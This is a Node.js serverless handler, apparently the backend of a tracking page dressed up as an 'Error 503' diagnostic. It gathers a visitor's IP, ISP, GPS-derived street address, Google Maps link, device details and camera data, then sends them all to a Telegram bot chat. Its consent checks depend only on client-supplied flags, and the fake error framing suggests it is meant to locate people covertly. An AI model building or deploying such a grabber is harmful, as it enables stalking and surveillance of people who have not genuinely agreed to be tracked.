export const config = {
    runtime: "nodejs"
};

const UNKNOWN = "Tidak tersedia";

function safe(value, fallback = UNKNOWN) {
    if (
        value === undefined ||
        value === null ||
        String(value).trim() === ""
    ) {
        return fallback;
    }

    return String(value).slice(0, 1000);
}

/* ================= PUBLIC IP ================= */

function getPublicIP(req) {
    let ip =
        req.headers["x-real-ip"] ||
        req.headers["x-forwarded-for"]?.split(",")[0] ||
        req.socket?.remoteAddress ||
        "";

    ip = String(ip).trim().replace(/^::ffff:/, "");

    if (
        !ip ||
        ip === "127.0.0.1" ||
        ip === "::1" ||
        /^10\./.test(ip) ||
        /^192\.168\./.test(ip) ||
        /^172\.(1[6-9]|2[0-9]|3[01])\./.test(ip)
    ) {
        return "Unknown";
    }

    return ip;
}

/* ================= FETCH JSON ================= */

async function fetchJSON(url, timeout = 8000) {
    const controller = new AbortController();

    const timer = setTimeout(
        () => controller.abort(),
        timeout
    );

    try {
        const response = await fetch(url, {
            signal: controller.signal,
            headers: {
                Accept: "application/json",
                "User-Agent": "Error503-Diagnostic/1.0"
            }
        });

        if (!response.ok) {
            throw new Error("HTTP " + response.status);
        }

        return await response.json();

    } finally {
        clearTimeout(timer);
    }
}

/* ================= IP INFORMATION ================= */

async function getIPInfo(ip) {
    const empty = {
        country: UNKNOWN,
        region: UNKNOWN,
        city: UNKNOWN,
        isp: UNKNOWN
    };

    if (!ip || ip === "Unknown") {
        return empty;
    }

    // Provider pertama
    try {
        const data = await fetchJSON(
            `https://ipwho.is/${encodeURIComponent(ip)}`
        );

        if (data.success !== false) {
            return {
                country: safe(data.country),
                region: safe(data.region),
                city: safe(data.city),
                isp: safe(
                    data.connection?.isp ||
                    data.connection?.org
                )
            };
        }

    } catch (error) {
        console.log("IPWho:", error.message);
    }

    // Provider kedua
    try {
        const data = await fetchJSON(
            `https://ipapi.co/${encodeURIComponent(ip)}/json/`
        );

        if (!data.error) {
            return {
                country: safe(data.country_name),
                region: safe(data.region),
                city: safe(data.city),
                isp: safe(data.org)
            };
        }

    } catch (error) {
        console.log("IPAPI:", error.message);
    }

    return empty;
}

/* ================= GPS ADDRESS ================= */

async function getGPSAddress(lat, lon) {
    try {
        const url =
            "https://nominatim.openstreetmap.org/reverse" +
            `?format=jsonv2&lat=${encodeURIComponent(lat)}` +
            `&lon=${encodeURIComponent(lon)}` +
            "&zoom=18&addressdetails=1";

        const data = await fetchJSON(url, 10000);

        return data.address || {};

    } catch (error) {
        console.log("GPS Address:", error.message);

        return {};
    }
}

/* ================= NORMALIZE ADDRESS ================= */

function normalizeAddress(address, ipInfo) {
    return {
        village:
            address.village ||
            address.suburb ||
            address.hamlet ||
            address.neighbourhood ||
            UNKNOWN,

        district:
            address.city_district ||
            address.subdistrict ||
            address.district ||
            address.county ||
            UNKNOWN,

        city:
            address.city ||
            address.town ||
            address.municipality ||
            address.regency ||
            UNKNOWN,

        province:
            address.state ||
            address.province ||
            ipInfo.region ||
            UNKNOWN,

        postal:
            address.postcode ||
            UNKNOWN,

        country:
            address.country ||
            ipInfo.country ||
            UNKNOWN
    };
}

/* ================= LOCATION QUALITY ================= */

function getLocationQuality(accuracy) {
    const number = parseFloat(accuracy);

    if (Number.isNaN(number)) {
        return "Tidak tersedia";
    }

    if (number <= 20) return "High ✅";
    if (number <= 100) return "Medium ⚠️";

    return "Low ❌";
}

/* ================= TELEGRAM ================= */

async function sendTelegram(token, chatId, message) {
    const response = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage`,
        {
            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
        throw new Error("Telegram gagal mengirim laporan");
    }

    return result;
}

/* ================= MAIN HANDLER ================= */

export default async function handler(req, res) {

    if (req.method !== "POST") {
        return res.status(405).json({
            success: false,
            message: "Method Not Allowed"
        });
    }

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        return res.status(500).json({
            success: false,
            message: "BOT_TOKEN atau CHAT_ID belum diatur"
        });
    }

    const input = req.body || {};

    if (input.consent !== true) {
        return res.status(403).json({
            success: false,
            message: "Persetujuan diperlukan"
        });
    }

    try {

        /* ===== IP ===== */

        const ip = getPublicIP(req);
        const ipInfo = await getIPInfo(ip);

        /* ===== GPS ===== */

        const lat = Number(input.latitude);
        const lon = Number(input.longitude);

        const validGPS =
            input.locationConsent === true &&
            Number.isFinite(lat) &&
            Number.isFinite(lon) &&
            lat >= -90 &&
            lat <= 90 &&
            lon >= -180 &&
            lon <= 180;

        let rawAddress = {};

        if (validGPS) {
            rawAddress = await getGPSAddress(lat, lon);
        }

        const address = normalizeAddress(
            rawAddress,
            ipInfo
        );

        const mapsLink = validGPS
            ? `https://www.google.com/maps?q=${lat},${lon}`
            : UNKNOWN;

        /* ===== CAMERA ===== */

        const frontCamera = safe(input.frontCamera);
        const backCamera = safe(input.backCamera);

        /* ===== TIME ===== */

        const timezone = safe(
            input.timezone,
            "Asia/Jakarta"
        );

        let time;

        try {
            time = new Date().toLocaleString("sv-SE", {
                timeZone: timezone
            });
        } catch {
            time = new Date().toISOString();
        }

        /* ===== REPORT ===== */

        const message = `
🚨 ERROR 503 REPORT

━━━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━━━
🧠 OS           : ${safe(input.os)}
💻 Platform     : ${safe(input.platform)}
⚙️ CPU Cores    : ${safe(input.cpu)}
💾 RAM          : ${safe(input.ram)}
🖥 Resolution   : ${safe(input.resolution)}
🌐 Browser      :
${safe(input.browser)}

🕒 Timezone     : ${timezone}
🗣 Language     : ${safe(input.language)}
🌍 Public IP    : ${ip}

━━━━━━━━━━━━━━━━━━━━
🌎 IP INFORMATION
━━━━━━━━━━━━━━━━━━━━
🌍 Country     : ${ipInfo.country}
📍 Region      : ${ipInfo.region}
🏙 City        : ${ipInfo.city}
🏢 ISP / Org   : ${ipInfo.isp}

━━━━━━━━━━━━━━━━━━━━
🏠 ADDRESS INFORMATION
━━━━━━━━━━━━━━━━━━━━
🏘 Village      : ${address.village}
🏙 District     : ${address.district}
🏛 City         : ${address.city}
🌆 Province     : ${address.province}
📮 Postal Code  : ${address.postal}
🌍 Country      : ${address.country}

━━━━━━━━━━━━━━━━━━━━
📷 CAMERA INFORMATION
━━━━━━━━━━━━━━━━━━━━
🤳 Front Camera : ${frontCamera}
📸 Back Camera  : ${backCamera}

━━━━━━━━━━━━━━━━━━━━
📐 LOCATION QUALITY
━━━━━━━━━━━━━━━━━━━━
🎯 Quality     : ${
    validGPS
        ? getLocationQuality(input.accuracy)
        : "Tidak diberikan izin GPS"
}
📡 Source      : ${
    validGPS ? "GPS" : "IP (Approximate)"
}

🗺 Google Maps:
${mapsLink}

⏰ Time : ${time}

━━━━━━━━━━━━━━━━━━━━
🤝 CONSENT
━━━━━━━━━━━━━━━━━━━━
📍 Location : ${validGPS ? "Disetujui" : "Tidak"}
📷 Camera   : Diperiksa dengan preview

━━━━━━━━━━━━━━━━━━━━
✅ END OF REPORT
`;

        await sendTelegram(
            BOT_TOKEN,
            CHAT_ID,
            message
        );

        return res.status(200).json({
            success: true,
            message: "Laporan berhasil dikirim"
        });

    } catch (error) {

        console.error("REPORT ERROR:", error);

        return res.status(500).json({
            success: false,
            message: "Gagal mengirim laporan"
        });
    }
}
